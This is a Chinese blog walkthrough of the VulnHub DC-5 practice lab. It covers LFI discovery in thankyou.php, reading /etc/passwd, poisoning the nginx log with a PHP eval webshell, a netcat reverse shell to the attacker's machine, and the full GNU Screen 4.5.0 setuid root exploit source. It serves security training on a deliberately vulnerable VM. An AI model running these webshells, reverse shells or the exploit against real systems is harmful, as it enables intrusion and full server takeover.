
--- 
title:  [ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-5 通关详解 (附靶机搭建教程) 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ 




#### 文章目录
- - - <ul><li>- - - - - - - - - - - <ul><li>- - - - - - - - - - - - - - - - - - <ul><li>- - 


## 一、环境搭建：

### 1、靶场描述

```
DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).
As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.
And just for the record, there is no phpmailer exploit involved. :-)
The ultimate goal of this challenge is to get root and to read the one and only flag.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.
But if you're really, really stuck, you can watch this video which shows the first step.

```

>  
 只有一个flag 


### 2、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/dc-5,314/

```

>  
 下载下来的文件如下 <img src="https://img-blog.csdnimg.cn/c9f6992ab0e7403b87b83fb792533ed8.png" alt="在这里插入图片描述"> 


### 3、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 


<img src="https://img-blog.csdnimg.cn/1b39b2a7bfb746259b3beb35e221f1b7.png" alt="在这里插入图片描述">

>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/81bf0473859940d79888e8f5cd0cc243.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/bc06840cf27a45058d8a172061d03c1d.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 


<img src="https://img-blog.csdnimg.cn/d783b0a13bca40278105ffecd8bd1725.png" alt="在这里插入图片描述">

>  
 虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/1174e950c19b4eb7b6ea367bda2cd532.png" alt="在这里插入图片描述">

## 二、渗透靶场

### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为：192.168.233.0/24 


### 2、信息收集：寻找靶机真实IP

>  
 使用nmap进行探活，寻找靶机ip 


```
nmap -sP 192.168.233.0/24

```

<img src="https://img-blog.csdnimg.cn/e4a5566b12024c7aa679d779f6c2050e.png" alt="在这里插入图片描述">

>  
 也可以使用arp-scan进行探活，寻找靶机ip 


```
arp-scan -l

```

<img src="https://img-blog.csdnimg.cn/ffadaafdcd264d57a71b2ad86484bcb4.png" alt="在这里插入图片描述">

>  
 本机ip为192.168.233.130 所以分析可得靶机ip为192.168.233.181 


```
192.168.233.1		vm8网卡
192.168.233.2		网关
192.168.233.181	靶机
192.168.233.254	DHCP服务器
192.168.233.130	kali本机

```

### 3、信息收集：探端口及服务

>  
 使用nmap探活端口 


```
nmap -A -p- -v 192.168.233.180

```

<img src="https://img-blog.csdnimg.cn/4b844b65492a433cbfde9b01730da887.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/ddebe77b114f4c5daf33bf51f7a1edd8.png" alt="在这里插入图片描述">

>  
 发现开放了80端口，存在web服务，nginx 1.6.2 发现开放了111端口，rpcbind 2-4 发现开放了48338端口 


>  
 也可以使用masscan探活端口 masscan --rate=10000 --ports 0-65535 192.168.233.181 


<img src="https://img-blog.csdnimg.cn/6e9dd35797734bebbe78ba08c1c1c5ab.png" alt="在这里插入图片描述">

>  
 然后进行web指纹识别 


```
whatweb -v 192.168.233.181

```

<img src="https://img-blog.csdnimg.cn/12f0cea5a4b74f429c565f6a1c0f4719.png" alt="在这里插入图片描述">

### 4、访问web服务

```
http://192.168.233.181/

```

<img src="https://img-blog.csdnimg.cn/cf198a0100554067a18e8b9c39077bc9.png" alt="在这里插入图片描述">

>  
 发现有一个留言板，随便输入一下并提交 


```
http://192.168.233.181/contact.php

```

<img src="https://img-blog.csdnimg.cn/0484c043079f4804944e45f1ea0edc5e.png" alt="在这里插入图片描述">

>  
 提交完成之后发现切入点 页面跳转到Thankyou.php，并且在URL地址栏可以看到参数，GET方式传参 


```
http://192.168.233.181/thankyou.php?firstname=AAAAA&amp;lastname=BBBBB&amp;country=australia&amp;subject=CCCCC

```

<img src="https://img-blog.csdnimg.cn/06f6a25e850f40c9b58da6452350ae97.png" alt="在这里插入图片描述">

>  
 突然发现这儿变成2017了，之前好像是2019 


<img src="https://img-blog.csdnimg.cn/0de6cd6bfbbf4e92a99765790d670e7c.png" alt="在这里插入图片描述">

>  
 琢磨琢磨，最后发现，只要一刷新页面，就会变，猜想存在文件包含 


<img src="https://img-blog.csdnimg.cn/deb4fa9517b149ea83ca1ff7e2f648c2.png" alt="在这里插入图片描述">

### 5、bp爆破确认存在文件包含

>  
 使用BurpSuite抓包，爆破后台页面，由于是php站，我们选择php字典 


<img src="https://img-blog.csdnimg.cn/197036ccaddd45888757282837728cc3.png" alt="在这里插入图片描述">

>  
 导入一个php字典，进行爆破 


<img src="https://img-blog.csdnimg.cn/d6515b8161fd4eb295d0d7445660cc7a.png" alt="在这里插入图片描述">

>  
 发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面 


<img src="https://img-blog.csdnimg.cn/563c2c4550c64897ad4fa209317fce3e.png" alt="在这里插入图片描述">

>  
 打开这几个页面，发现发开footer.php时，不断刷新，图标也在不断地变化，确认文件包含页面是footer.php 


```
http://192.168.233.181/footer.php

```

<img src="https://img-blog.csdnimg.cn/d71fcc542a3340ebb01094b325c3d52b.png" alt="在这里插入图片描述">

### 6、Fuzz确认存在文件包含漏洞

>  
 使用BurpSuite爆破文件包含的变量名即可能被包含的值 


```
http://192.168.220.139/thankyou.php?page=footer.php

```

>  
 选择草叉模式进行爆破，选择两个爆破点，一个是文件包含变量名，一个是包含值 


<img src="https://img-blog.csdnimg.cn/6976df1e573e46219901f32dddcfa2e7.png" alt="在这里插入图片描述">

>  
 导入第一个字典，变量名字典 


<img src="https://img-blog.csdnimg.cn/a48c1a7e36c94e60adde4ecf335c99b3.png" alt="在这里插入图片描述">

>  
 导入第二个字典（passwd路径字典） 


<img src="https://img-blog.csdnimg.cn/53b41d911a534cbeaf3be432fe63a88a.png" alt="在这里插入图片描述">

>  
 成功爆破出八对值，但是只有一个变量名 


<img src="https://img-blog.csdnimg.cn/a882c8bbfc77467197489d178689d38a.png" alt="在这里插入图片描述">

```
/thankyou.php?file=%2e%2e%2fetc%2fpasswd

```

>  
 访问最短的吧路径，成功包含到字典 


```
http://192.168.233.181/thankyou.php?file=%2fetc%2fpasswd
http://192.168.233.181/thankyou.php?file=/etc/passwd

```

<img src="https://img-blog.csdnimg.cn/85dd671814b149d2a6bb658bbe5defe9.png" alt="在这里插入图片描述">

### 7、确认日志文件的位置

>  
 由于前面信息收集我们确认了是nginx的站，访问日志和错误日志应该如下  


```
/var/log/nginx/access.log
/var/log/nginx/error.log

```

>  
 包含看一下 


```
http://192.168.233.181/thankyou.php?file=/var/log/nginx/error.log

```

<img src="https://img-blog.csdnimg.cn/cd71477b2fc04356b0133701be466958.png" alt="在这里插入图片描述">

<img src="https://img-blog.csdnimg.cn/aadcb4528d6344fca779b2fa5565a6a6.png" alt="在这里插入图片描述">

### 8、写入一句话木马

>  
 这里是接着之前来的，但是由于网络环境发生了变化 ip由192.168.233.181变成了192.168.233.184 


#### 1.写入phpinfo

>  
 写入phpinfo 访问如下日志文件，使用burpsuite抓包 


```
http://192.168.233.184/thankyou.php?file=/var/log/nginx/access.log

```

>  
 向日志文件中写入phpinfo一句话木马 


```
GET &lt;?php phpinfo();?&gt; HTTP/1.1

```

<img src="https://img-blog.csdnimg.cn/71790acc027146f9a01947d37737d08a.png" alt="在这里插入图片描述">

>  
 重新打开日志文件可以看到成功写入，成功回显出phpinfo信息 


<img src="https://img-blog.csdnimg.cn/416ad62b4dc546cd8cc47347e19e9528.png" alt="在这里插入图片描述">

#### 2.写入webshell

>  
 采用&lt;?php @eval($_REQUEST[powershell])?&gt;替换上面的&lt;?php phpinfo();?&gt;就OK。 


```
GET &lt;?php @eval($_REQUEST[powershell])?&gt; HTTP/1.1

```

<img src="https://img-blog.csdnimg.cn/adb6de2eec7a4dacb101566360122d7f.png" alt="在这里插入图片描述">

#### 3.蚁剑成功连接webshell

>  
 输入url和密码 


```
http://192.168.233.184/thankyou.php?file=/var/log/nginx/access.log
Powershell

```

>  
 点击右上角测试连接，发现连接成功 


<img src="https://img-blog.csdnimg.cn/98be67d2e0f34d4992621ca477b84cd2.png" alt="在这里插入图片描述">

>  
 点击左上角的添加数据 


<img src="https://img-blog.csdnimg.cn/ea7e9fa73a8e40ad947f5dfa10ef608e.png" alt="在这里插入图片描述">

>  
 成功添加数据双击进入文件系统 


<img src="https://img-blog.csdnimg.cn/69b415f23bc04c40afe309b5c46be6bc.png" alt="在这里插入图片描述">

### 9、新建shell文件

>  
 可以在服务器/tmp目录下新建一个powershell.php文件，写入一句话木马并重新连接 


#### 1.创建powershell.php文件

>  
 右键在tmp目录下新建php文件，名称为powershell.php。 


<img src="https://img-blog.csdnimg.cn/0dfb5d1d13024de9906b8141b731dd2c.png" alt="在这里插入图片描述">

#### 2.写入webshell

>  
 双击powershell.txt进入编辑模式，写入shell并保存。 


```
hello-world!!!
&lt;?php
@eval($_REQUEST[powershell])
?&gt;

```

<img src="https://img-blog.csdnimg.cn/0abc9fa0626447b5ab388f68ddf1ff67.png" alt="在这里插入图片描述">

#### 3.访问一下新建的shell

>  
 我们采用之前发现的文件包含漏洞包含我们新建的shell就可以访问到shell，我们的shell有输出，在页面下方可以看到我们的输出hello-world!!!。 


```
http://192.168.233.184/thankyou.php?file=/tmp/powershell.php

```

<img src="https://img-blog.csdnimg.cn/ada8216c1edc4340afd9d280b09c4dba.png" alt="在这里插入图片描述">

#### 4.蚁剑连接新的webshell

>  
 蚁剑重新连接webshell，右键添加数据，填入url以及密码，url就是我们新建的shell地址。 


```
http://192.168.233.184/thankyou.php?file=/tmp/powershell.php
powershell

```

<img src="https://img-blog.csdnimg.cn/1620c7b29b59422f9fc7c7bae6e6b706.png" alt="在这里插入图片描述">

>  
 连接成功右键进入虚拟终端 


<img src="https://img-blog.csdnimg.cn/aa46d6ce7f874783b95abc6e7659db3a.png" alt="在这里插入图片描述">

### 10、反弹shell到kali

>  
 蚁剑终端不如kali终端，我们反弹shell到kali 


#### 1.kali上监听

```
nc -lnvp 55555 

```

<img src="https://img-blog.csdnimg.cn/dff73bdc0c97446d9a7f5b916a1247f2.png" alt="在这里插入图片描述">

#### 2.靶机执行shell反弹命令

```
nc -e /bin/bash 192.168.233.130 55555

```

<img src="https://img-blog.csdnimg.cn/e89204e5d1ab428abcc355f5ba23e53e.png" alt="在这里插入图片描述">

#### 3.反弹shell成功

>  
 进入kali，发现反弹shell成功，执行id命令 这个shell有些不方便，需要进入交互式shell 


<img src="https://img-blog.csdnimg.cn/3efbb86461b04937bb1fd569fe23b396.png" alt="在这里插入图片描述">

#### 4.进入交互式shell

>  
 这里使用python进入交互式shell，命令如下 


```
python -c "import pty;pty.spawn('/bin/bash')"

```

>  
 成功进入交互式shell 


<img src="https://img-blog.csdnimg.cn/13e65e826f6542059685224af7d0d303.png" alt="在这里插入图片描述">

### 11、suid提权

>  
 使用find命令，查找具有suid权限的命令 


#### 1.发现screen-4.5.0

>  
 发现screen-4.5.0，使用41145.sh脚本提权 GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。 GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。 下面两条命令都行 


```
find / -user root -perm -4000 -print 2&gt;/dev/null 
find / -perm -u=s -type f 2&gt;/dev/null

```

<img src="https://img-blog.csdnimg.cn/5ce69d9d3a914e358f61d237def97a2e.png" alt="在这里插入图片描述">

>  
 接下来查找可用于screen 4.5.0的漏洞脚本文件 


#### 2.查找screen 4.5.0漏洞脚本文件

```
searchsploit screen 4.5.0

```

<img src="https://img-blog.csdnimg.cn/68cc75c5c39e447bbe094ada995b8067.png" alt="在这里插入图片描述">

>  
 我们发现有两个发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下 


```
cp /usr/share/exploitdb/exploits/linux/local/41154.sh ./41154.sh

```

<img src="https://img-blog.csdnimg.cn/ad4e5c8462e44bba80841d0472975af8.png" alt="在这里插入图片描述">

#### 3.查看cat 41154.sh脚本文件

>  
 查看cat 41154.sh脚本文件 


```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat &lt;&lt; EOF &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat &lt;&lt; EOF &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell

```

<img src="https://img-blog.csdnimg.cn/4519ff7c912548f7b17cdc7a784f2088.png" alt="在这里插入图片描述">

#### 4.将第一部分内容写到libhax.c并编译

>  
 按照脚本提示，先将第一部分内容写到libhax.c中(一共有三个部分) 创建一个文件夹存放三个部分的脚本 


```
mkdir dc-5
cd dc-5

```

<img src="https://img-blog.csdnimg.cn/dfbf3362874c447688c5eef766e65480.png" alt="在这里插入图片描述">

>  
 创建libhax.c文件，用vim编辑，当然，也可以直接使用vim创建文件 


```
touch libhax.c
vim libhax.c

```

>  
 写入如下文件 


```
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){<!-- -->
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

```

<img src="https://img-blog.csdnimg.cn/cf8670e886ef47b28151b486754e89d3.png" alt="在这里插入图片描述">

>  
 确认文件写入成功 


```
cat libhax.c

```

<img src="https://img-blog.csdnimg.cn/38d2cefd641640a0b7ef55d443e6e15d.png" alt="在这里插入图片描述">

>  
 然后编译这个脚本 


```
gcc -fPIC -shared -ldl -o libhax.so libhax.c

```

<img src="https://img-blog.csdnimg.cn/01b6c855a07c4b34b9547eefdb50d9ba.png" alt="在这里插入图片描述">

>  
 查看编译生成的os文件 


<img src="https://img-blog.csdnimg.cn/175a1d8f62c44cb8a3e6de2679623825.png" alt="在这里插入图片描述">

#### 5.将第二部分的代码写入rootshell.c并编译

>  
 将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件 这里我直接采用vim创建文件 


```
vim rootshell.c

```

>  
 写入如下内容 


```
#include &lt;stdio.h&gt;
int main(void){<!-- -->
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}

```

>  
 确认文件写入成功 


```
cat rootshell.c

```

<img src="https://img-blog.csdnimg.cn/81cb227f59c047c5bc90eb00454cc961.png" alt="在这里插入图片描述">

>  
 编译.c文件 


```
gcc -fPIC -shared -ldl -o rootshell.so rootshell.c

```

<img src="https://img-blog.csdnimg.cn/8d13eecaffe248a2b8b5fd430f8fc015.png" alt="在这里插入图片描述">

#### 6.将第三部分代码写入dc5.sh文件

>  
 将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!/bin/bash表示执行环境。最后保存是需要输入:set ff=unix是为了防止脚本的格式错误。 


```
#!/bin/bash
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell 

```

```
:set ff=unix

```

<img src="https://img-blog.csdnimg.cn/b3701b0ca2d0446d875a3057910e1132.png" alt="在这里插入图片描述">

>  
 完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。 将这三个文件传到靶机 


<img src="https://img-blog.csdnimg.cn/be09cddaa650439b99b747a1b99e3199.png" alt="在这里插入图片描述">

>  
 这里我把不要的删除 


```
rm -rf libhax.c
rm -rf rootshell.c
rm -rf rootshell.so

```

<img src="https://img-blog.csdnimg.cn/257516c5577e4b5db00968023307c497.png" alt="在这里插入图片描述">

#### 7.上传文件到靶机

>  
 把三个文件上传至靶机的/tmp文件下，这里讲解三种思路 


##### 1、利用蚁剑上传

>  
 打开蚁剑，打开连接，进入文件系统，进入/tmp目录，右键选择文件上传就行了。 <img src="https://img-blog.csdnimg.cn/e1abb90e7a534a6b9e3696d6198db86e.png" alt="在这里插入图片描述"> 


##### 2、利用卡里启服务靶机访问上传

>  
 可以在kali里面相应文件目录下起一个服务，比如说python服务 


```
python -m http.server 80

```

>  
 然后靶机采用curl获取文件就行 


```
curl http://攻击机IP/文件名

```

>  
 这里我没有尝试，只提供一种思路，如果下载不下来可以尝试在服务端将文件打包 


##### 3、利用SCP从攻击机取文件

>  
 靶机shell中执行如下命令从攻击机取文件，需要注意的是，需要开放22端口 


```
scp -r root@192.168.233.130:/root/dc-5 /tmp/dc-5
scp -r root@攻击机IP:文件所在绝对路径 目的地绝对路径

```

#### 8.执行dc5.sh

>  
 在shell中切换到/tmp目录下（dc5.sh所在目录） 


<img src="https://img-blog.csdnimg.cn/af478e3859d3432599f84bcceba398b1.png" alt="在这里插入图片描述">

>  
 注意给dc5.sh加执行权限 


```
chmod +x dc5.sh
chmod 777 dc5.sh

```

<img src="https://img-blog.csdnimg.cn/9297244c573a40a491117ab0d386f82d.png" alt="在这里插入图片描述">

>  
 拿到root用户，成功提权 在root目录下拿到flag 


<img src="https://img-blog.csdnimg.cn/14bf48c101d04346847ae4de39c2c7e6.png" alt="在这里插入图片描述">

## 三、相关资源

         
